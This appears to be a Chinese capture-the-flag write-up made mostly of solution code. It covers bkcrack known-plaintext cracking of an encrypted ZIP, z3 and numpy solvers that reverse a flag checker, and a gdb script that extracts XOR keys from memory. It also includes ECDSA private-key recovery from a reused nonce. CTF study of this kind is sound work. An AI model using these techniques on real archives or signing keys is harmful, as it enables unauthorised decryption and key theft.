bkcrack -C deflated.zip -c .git/HEAD -p HEAD.txt
bkcrack -C deflated.zip -k f2635bca a91bec3a ec81bdf9 -D decrypted.zip
git show 01c525a:
print_flag.py > print_flag.py
import hashlib
from z3 import *

class Brain:
    def __init__(self, neurons):
        self.thought_size = 10
        self.neurons = [row.copy() for row in neurons]  # 使用列表推导式深拷贝

    def brainstem(self):
        flat = sum(self.neurons, [])
        joined = ",".join(map(str, flat))
        return hashlib.sha256(joined.encode()).hexdigest()

    def rot(self, data):
        for i in range(len(data)):
            row = (3 * i + 7) % self.thought_size
            col = (9 * i + 3) % self.thought_size
            self.neurons[row][col] ^= data[i]

    def think(self, data):
        thought = [0] * self.thought_size
        for i in range(self.thought_size):
            thought[i] = sum(self.neurons[i][j] * data[j] for j in range(self.thought_size))
        self.neurons = self.neurons[1:] + [thought.copy()]
        return thought

# ---------------------- 原始数据填充 ----------------------
healthy_brain = [
    [71, 101, 18, 37, 41, 69, 80, 28, 23, 48],
    [35, 32, 44, 24, 27, 20, 34, 58, 24, 9],
    [73, 29, 37, 94, 27, 58, 104, 65, 116, 44],
    [26, 83, 77, 116, 9, 96, 111, 118, 52, 62],
    [100, 15, 119, 53, 59, 34, 38, 68, 104, 110],
    [51, 1, 54, 62, 56, 120, 4, 80, 60, 120],
    [125, 92, 95, 98, 97, 110, 93, 33, 128, 93],
    [70, 23, 123, 40, 75, 23, 104, 73, 52, 6],
    [14, 11, 99, 16, 124, 52, 14, 73, 47, 66],
    [128, 11, 49, 111, 64, 108, 14, 66, 128, 101]
]

brainrot = b"gnilretskdi ,coffee ,ymotobol ,amenic etulosba ,oihO ni ylno ,oihO ,pac eht pots ,pac ,yadot yarp uoy did ,pu lio ,eohs ym elkcub 2 1 ,sucric latigid ,zzir tanec iaK ,tac frumS ,yzzilg ,ekahs melraH ,tanec iaK ,raebzaf ydderF ,gnixamnoog ,hoesac ,relzzir eht rof ttayg ruoy tuo gnikcits ,reppay ,gnippay ,pay ,gniggom ,gom,ttalcobmob ,gnillihc gnib ,deepswohsi ,tor niarb ,oitar + L ,ozob L ,L ,oitar ,ie ie iE ,suoived ,emem seimmug revas efil dna seceip s'eseeR ,io io io ,ytrap zzir koTkiT ,teggun ,su gnoma ,retsopmi ,yssus ,suS ,elgnid eladnuaQ ,gnos metsys ym ni atnaF ,kcil suoived ,syddid ta sthgin 5 ,hsinapS ro hsilgnE .gnos teksirb ,agnizab ,bruc eht etib ,orb lil ,dulb ,ni gnihcram og stnias eht nehw ho ,neerb fo seert ees I ,sinneD ekud ,biks no ,ennud yvvil ,knorg ybab ,rehtorb pu s'tahw ,gab eht ni seirf eht tuP ,edaf repat wol ,yddid ,yddirg ,ahpla ,gnixxamskool ,gninoog ,noog ,egde ,gnigde ,raeb evif ydderf ,ekahs ecamirg ,ynnacnu ,arua ,daeh daerd tnalahcnon ,ekard ,gnixat munaF ,xat munaf ,zzir idibikS ,yug llihc ,eiddab ,kooc reh/mih tel ,gnikooc ,kooc ,nissub ,oihO ,amgis eht tahw ,amgis ,idibikS no ,relzzir ,gnizzir ,zzir ,wem ,gniwem ,ttayg ,teliot idibikS ,idibikS"[
           ::-1]

required_thoughts = [
    [59477, 41138, 59835, 73146, 77483, 59302, 102788, 67692, 62102, 85259],
    [40039, 59831, 72802, 77436, 57296, 101868, 69319, 59980, 84518, 73579466],
    [59783, 73251, 76964, 58066, 101937, 68220, 59723, 85312, 73537261, 7793081533],
    [71678, 77955, 59011, 102453, 66381, 60215, 86367, 74176247, 9263142620, 982652150581],
]

# ---------------------- 主逻辑 ----------------------
brain = Brain(healthy_brain)
brain.rot(brainrot)  # 处理 brainrot 数据

flag = bytearray()
for block_idx in range(4):
    matrix = brain.neurons  # 当前神经元矩阵
    target = required_thoughts[block_idx]

    # 使用Z3求解器约束整数范围
    s = Solver()
    x = [Int(f'x_{i}') for i in range(10)]
    for var in x:
        s.add(var >= 0, var <= 255)  # 确保输入是合法字节

    # 添加线性方程组约束
    for i in range(10):
        s.add(sum(matrix[i][j] * x[j] for j in range(10)) == target[i])

    if s.check() != sat:
        print(f"块 {block_idx} 无解")
        exit()

    model = s.model()
    solution = [model[var].as_long() for var in x]
    flag.extend(solution)
    brain.think(solution)  # 更新神经元矩阵

# 验证哈希并输出
if brain.brainstem() == "4fe4bdc54342d22189d129d291d4fa23da12f22a45bca01e75a1f0e57588bf16":
    print("Flag:", flag.decode())
else:
    print("哈希验证失败")
from hashlib import sha256

class Brain:
    def __init__(unc, neurons):
        unc.neurons = neurons
        unc.thought_size = 10

    def brainstem(unc):
        return sha256(",".join(str(x) for x in sum(unc.neurons, [])).encode()).hexdigest()

    def rot(unc, data):
        for i in range(len(data)):
            unc.neurons[(3 * i + 7) % unc.thought_size][(9 * i + 3) % unc.thought_size] ^= data[i]

    def think(unc, data):
        thought = [0] * unc.thought_size
        for i in range(unc.thought_size):
            thought[i] = sum(unc.neurons[i][j] * data[j] for j in range(unc.thought_size))
        unc.neurons[:-1] = unc.neurons[1:]
        unc.neurons[-1] = thought
        return thought
    
healthy_brain = [[71, 101, 18, 37, 41, 69, 80, 28, 23, 48], [35, 32, 44, 24, 27, 20, 34, 58, 24, 9], [73, 29, 37, 94, 27, 58, 104, 65, 116, 44], [26, 83, 77, 116, 9, 96, 111, 118, 52, 62], [100, 15, 119, 53, 59, 34, 38, 68, 104, 110], [51, 1, 54, 62, 56, 120, 4, 80, 60, 120], [125, 92, 95, 98, 97, 110, 93, 33, 128, 93], [70, 23, 123, 40, 75, 23, 104, 73, 52, 6], [14, 11, 99, 16, 124, 52, 14, 73, 47, 66], [128, 11, 49, 111, 64, 108, 14, 66, 128, 101]]
brainrot = b"gnilretskdi ,coffee ,ymotobol ,amenic etulosba ,oihO ni ylno ,oihO ,pac eht pots ,pac ,yadot yarp uoy did ,pu lio ,eohs ym elkcub 2 1 ,sucric latigid ,zzir tanec iaK ,tac frumS ,yzzilg ,ekahs melraH ,tanec iaK ,raebzaf ydderF ,gnixamnoog ,hoesac ,relzzir eht rof ttayg ruoy tuo gnikcits ,reppay ,gnippay ,pay ,gniggom ,gom,ttalcobmob ,gnillihc gnib ,deepswohsi ,tor niarb ,oitar + L ,ozob L ,L ,oitar ,ie ie iE ,suoived ,emem seimmug revas efil dna seceip s'eseeR ,io io io ,ytrap zzir koTkiT ,teggun ,su gnoma ,retsopmi ,yssus ,suS ,elgnid eladnuaQ ,gnos metsys ym ni atnaF ,kcil suoived ,syddid ta sthgin 5 ,hsinapS ro hsilgnE .gnos teksirb ,agnizab ,bruc eht etib ,orb lil ,dulb ,ni gnihcram og stnias eht nehw ho ,neerb fo seert ees I ,sinneD ekud ,biks no ,ennud yvvil ,knorg ybab ,rehtorb pu s'tahw ,gab eht ni seirf eht tuP ,edaf repat wol ,yddid ,yddirg ,ahpla ,gnixxamskool ,gninoog ,noog ,egde ,gnigde ,raeb evif ydderf ,ekahs ecamirg ,ynnacnu ,arua ,daeh daerd tnalahcnon ,ekard ,gnixat munaF ,xat munaf ,zzir idibikS ,yug llihc ,eiddab ,kooc reh/mih tel ,gnikooc ,kooc ,nissub ,oihO ,amgis eht tahw ,amgis ,idibikS no ,relzzir ,gnizzir ,zzir ,wem ,gniwem ,ttayg ,teliot idibikS ,idibikS"[::-1]

brain = Brain(healthy_brain)
brain.rot(brainrot)

# flag = input("> ").encode()
# if not len(flag) == 40:
#     print("i'll be nice and tell you my thoughts have to be exactly 40 characters long")
#     exit()
required_thoughts = [
    [59477, 41138, 59835, 73146, 77483, 59302, 102788, 67692, 62102, 85259],
    [40039, 59831, 72802, 77436, 57296, 101868, 69319, 59980, 84518, 73579466],
    [59783, 73251, 76964, 58066, 101937, 68220, 59723, 85312, 73537261, 7793081533],
    [71678, 77955, 59011, 102453, 66381, 60215, 86367, 74176247, 9263142620, 982652150581],
]

# failed_to_think = False
# for i in range(0, len(flag), 10):
#     thought = brain.think(flag[i:i + 10])
#     if thought != required_thoughts[i//10]:
#         failed_to_think = True

# if failed_to_think or brain.brainstem() != "4fe4bdc54342d22189d129d291d4fa23da12f22a45bca01e75a1f0e57588bf16":
#     print("ermm... you might not be a s""igma...")
# else:
#     print("holy s""kibidi you popped off... go submit the flag")

import numpy as np

for i in range(4):
    A=np.linalg.inv(brain.neurons)
    C=A @ required_thoughts[i]
    for j in C:
        print(chr(round(j)),end='')
    brain.neurons[:-1]= brain.neurons[1:]
    brain.neurons[-1]=required_thoughts[i]
    
print(brain.brainstem())
bt # 查看调用栈
frame 5 # 切换到5栈帧
print key # 输出key
x/59xb key # 查看key区域的59个字节
info locals # 查看局部变量
# test.gdb文件
set pagination off
set confirm off

# 输出文件（二进制格式）
set$outfile = "all_keys.bin"
shell rm -f $outfile
# 清空旧文件

define extract_keys
    set$frame = 4
    while$frame <= 1003
        frame $frame
        if$pc == 0
            echo"Frame $frame is invalid.n"
        else
            # 检查key是否存在
            if &key == 0
                echo"Frame $frame: 'key' not found.n"
            else
                # 追加59字节到文件
                append binary memory outfile key (key + 59)
                echo"Appended Frame $framen"
            end
        end
        set$frame = $frame + 1
    end
end

extract_keys
echo"All keys saved to " + $outfile + "n"
quit
with open('outfile','rb') as f1,open('encrypted_flag.bin','rb') as f2:
    s1=f1.read()
    s2=f2.read()
    
s2=bytearray(s2)
for i in range(1000):
    for j in range(59):
        s2[j]^=s1[i*59+j]
        
print(bytes(s2))
from hashlib import sha256
from Crypto.Util.number import*

n = 115792089210356248762697446949407573529996955224135760342422259061068512044369

message1 = "The secp256r1 curve was used."
message2 = "k value may have been re-used."

r = 91684750294663587590699225454580710947373104789074350179443937301009206290695
s1 = 8734396013686485452502025686012376394264288962663555711176194873788392352477
s2 = 96254287552668750588265978919231985627964457792323178870952715849103024292631

H_m1 = bytes_to_long(sha256(message1.encode()).digest())
H_m2 = bytes_to_long(sha256(message2.encode()).digest())
print(f"H(m1) = {H_m1}")
print(f"H(m2) = {H_m2}")

diff_h = (H_m1 - H_m2) % n
diff_s = (s1 - s2) % n
inv_diff_s = inverse(diff_s, n)
k = (diff_h * inv_diff_s) % n
print(f"k = {k}")
r_inv = inverse(r, n)
d = ((s1 * k - H_m1) % n) * r_inv % n
print(f"Private key d = {d}")

k_inv = inverse(k, n)
computed_s1 = (k_inv * (H_m1 + d * r)) % n
computed_s2 = (k_inv * (H_m2 + d * r)) % n

print(long_to_bytes(d))
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]